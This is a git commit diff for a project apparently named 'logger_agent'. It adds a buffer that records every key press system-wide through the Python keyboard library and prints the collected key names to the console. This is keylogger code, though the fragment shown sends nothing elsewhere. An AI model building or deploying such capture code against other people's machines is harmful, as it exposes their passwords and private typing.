6e3b7eb8201b9b0477ae779c74082022a2b7c092
benjamin <2000beni770@gmail.com>
2025-02-17 16:20:42 +0200

    add buffer to the lister and writer

--- logger_agent/src/listener.py
+++ logger_agent/src/listener.py
@@ -3,9 +3,20 @@ import keyboard
 
 
 class Listener(ListenerInterface):
-    def start(self, *arg):
-        for key_handler in arg:
-            keyboard.on_press(key_handler)
+    def __init__(self):
+        super().__init__()
+        self.buffer = []
+
+    def get_buffer(self):
+        temp_buffer = self.buffer
+        self.buffer = []
+        return temp_buffer
+        
+    def key_handler(self, key):
+        self.buffer.append((key.name))
+
+    def start(self):
+        keyboard.on_press(self.key_handler)
 
     def stop(self):
         keyboard.wait('esc')
--- logger_agent/src/writer/console_log.py
+++ logger_agent/src/writer/console_log.py
@@ -2,5 +2,6 @@ from interface.writer_interface import WriterInterface
 
 
 class ConsoleLog(WriterInterface):
-    def write(self, message):
-        print(message.name)
+    def write(self, buffer):
+        for key in buffer:
+            print(key)
